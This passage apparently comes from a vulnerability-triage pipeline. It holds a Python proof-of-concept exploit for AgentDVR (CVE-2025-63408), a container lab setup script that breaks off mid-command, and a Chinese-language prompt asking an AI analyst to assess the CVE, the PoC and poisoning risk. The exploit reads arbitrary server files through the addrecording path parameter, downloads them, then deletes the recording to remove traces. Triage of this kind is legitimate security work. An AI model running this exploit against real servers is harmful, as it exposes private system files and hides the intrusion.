s.REC_NAME + \"-\" + str(uuid4())\nCAM_NAME = args.CAM_NAME\nOUT_FILE = args.OUT_FILE\n\n# Check if a camera exists\ntry:\n    print(f\"Camera - Exists? \", end=\"\", flush=True)\n    cam_check_url = URL + f\"/command/getObject?oid=1&ot=2\"\n    response = requests.get(cam_check_url, timeout=5)\n\n    \n    if \"error\" in response.json().keys():\n        print(f\"No\")\n        cam_create_url = URL + f\"/command/addCamera?name={CAM_NAME}\"\n        response = requests.get(cam_create_url, timeout=5)\n        assert response.json().get(\"status\") == \"ok\"\n        print(f\"Camera - {CAM_NAME} - Created.\")\n    else:\n        CAM_NAME = response.json().get(\"name\") \n        print(f\"Yes, {CAM_NAME}\")\nexcept Exception as e:\n    raise(e)\n\n\n# Now we can request a remote file\ntry:\n    print(f\"File - {SYS_FILE} - Request file\")\n    add_recording_url = URL + f\"/command/addrecording?oid=1&ot=2&path={SYS_FILE}&name={REC_NAME}\"\n    #print(add_recording_url)\n    response = requests.get(add_recording_url, timeout=5)\n    assert response.json().get('status') == \"ok\"\n    print(f\"File - {SYS_FILE} - Request successful\")\n    \nexcept requests.exceptions.ConnectTimeout:\n    raise SystemExit(f\"URL {URL} - Timed out.\")\nexcept requests.exceptions.JSONDecodeError:\n    raise SystemExit(f\"File {SYS_FILE} - Does not exist, exiting.\")\nexcept Exception as e:\n    raise Exception(f\"Unexpected exception during file request {e}\")\n\n\nprint(f\"File - {SYS_FILE} - Service restarting\", end=\"\", flush=True)\nn = 0\nwhile True:\n    if n >= 90:\n        raise SystemExit(f\"File - {SYS_FILE} - Timed out waiting for service to restart.\")\n    n += 1\n    print(\".\", end=\"\", flush=True)\n    sleep(1)\n    try:\n        check_server_url = URL + \"/login.json\"\n        response = requests.get(check_server_url, timeout=3)\n        if response.status_code == 200:\n            break\n    except requests.exceptions.ConnectionError:\n        pass\n    except Exception as e:\n        raise Exception(f\"Unexpected exception during server restart {e}\")\n\nprint(f\"\\nFile - {SYS_FILE} - Service ready to go!\")\n\n\ntry:\n    # If original file had an extension, the recording stream has an extension.\n    print(f\"File - {SYS_FILE} - Download file\", end=\"\", flush=True)\n    SYS_FILE_EXT = Path(SYS_FILE).suffix\n    stream_file_name = f\"{REC_NAME}{SYS_FILE_EXT}\"\n    stream_file_url = URL + f\"/streamFile.cgi?oid=1&ot=2&fn={stream_file_name}\"\n    response = requests.get(stream_file_url)\n    if response.status_code == 200:\n        print(\" OK\")\n    else:\n        print(f\" unclear: {response.status_code}\")\n        exit(1)\n\n    if OUT_FILE:\n        print(f\"File - {SYS_FILE} - Store to file '{OUT_FILE}'\", end=\"\", flush=True)\n        with open(OUT_FILE, \"wb\") as f:\n            f.write(response.content)\n        print(\" OK\")\n    else:\n        print(f\"File - {SYS_FILE} - Display as Text\")\n        print(f\"---\")\n        print(response.text)\n        print(f\"---\")\n\n    # Finally, Remove recording\n    print(f\"File - Remove recording - {stream_file_name}\", end=\"\", flush=True)\n    massdelete_url = URL + f\"/q.json?cmd=massdelete&oid=1&ot=2\"\n    data={\"files\":[\n            {\"name\": stream_file_name},\n        ]\n        }\n    response = requests.post(\n        massdelete_url,\n        json=data\n    )    \n    if response.status_code == 200:\n        print(\" OK\")\n\n        \nexcept Exception as e:\n    raise Exception(f\"Unexpected exception during file stream {e}\")\n\n\n\n\n---\n/tmp/b7e4bed5f6e9f5adfe37b2818fdc765f/run.sh\n---\n#!/bin/bash\n\n\nset -e\nCVE_NAME=cve-2025-63408\nUSER_ID=0 # or 1000\npodman run --rm \\\n    --name $CVE_NAME \\\n    --hostname $CVE_NAME \\\n    -e PUID=$USER_ID \\\n    -e PGID=$USER_ID \\\n    -e AGENTDVR_WEBUI_PORT=8090 \\\n    -e TZ=UTC \\\n    -v /home/agentdvr/AgentDVR/Media/Commands \\\n    -v /home/agentdvr/AgentDVR/Media/XML \\\n    -v /AgentDVR/Media/XML \\\n    -v /AgentDVR/Media/WebServerRoot/Media \\\n    -v /AgentDVR/Media/Models \\\n    -v /AgentDVR/Command\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
